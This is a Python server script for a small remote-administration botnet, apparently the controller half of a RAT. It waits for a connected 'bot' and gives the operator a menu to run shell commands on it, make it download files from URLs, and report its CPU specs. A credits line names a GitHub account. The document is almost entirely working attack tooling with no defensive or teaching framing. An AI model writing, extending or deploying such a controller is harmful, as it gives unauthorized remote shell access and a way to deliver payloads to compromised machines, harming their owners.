import socket
import os
import time
HOST = "127.0.0.1"
PORT = 5003
# send 1024 (1kb) a time (as buffer size)
BUFFER_SIZE = 5120
# create a socket object
s = socket.socket()

s.bind((HOST, PORT))

s.listen(5)
print(f"Listening as {HOST}:{PORT} ...")
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")


while True:
    # get the command from prompt
    command = input("\nEnter the command you wanna execute: ")
    # send the command to the client
    #client_socket.send(command.encode())
    if command.lower() == "exit":
        client_socket.send(command.encode())
        print("\nSorry to see you go :(")
        break
    if "download" in command.lower():
        try:
            client_socket.send(command.encode())
            down = client_socket.recv(BUFFER_SIZE).decode()
            print(down)
        except:
            print("command entered wrong/other error!")
    if 'shell' in command.lower():
        client_socket.send(command.encode())
        # retrieve command results
        results = client_socket.recv(BUFFER_SIZE).decode()
        # print them
        print(results)
    #standard help menu, nothing fancy
    if 'help' in command.lower():
        print("\n")
        print("="*40, "Help Menu", "="*40)
        print(" COMMANDS             USAGE                     OUTPUT")
        print(" help         help                           this menu lol")
        print(" download     download fileurl filename      file download")
        print(" shell        shell command                  shell access")
        print(" specs        specs                          returns bot core count and clock count")
        print(" credits      credits                        shows credit menu on project maker")  
        print("="*91)
    
    if 'clear' in command.lower():
        os.system("clear")
        print("menu cleared")
    #prints bot ip
    if "bots" in command.lower():
        print({client_address[0]})
    #sends specs command
    if "specs" in command.lower():
        client_socket.send(command.encode())
        cores = client_socket.recv(BUFFER_SIZE).decode()
        print("Core count is: " + cores)
        freq = client_socket.recv(BUFFER_SIZE).decode()
        print("CPU freuquency is: " + freq)
    if "credits" in command.lower():
        print("\ngithub.com/Incog-Makes")
# close connection to the client
client_socket.close()
# close server connection
s.close()
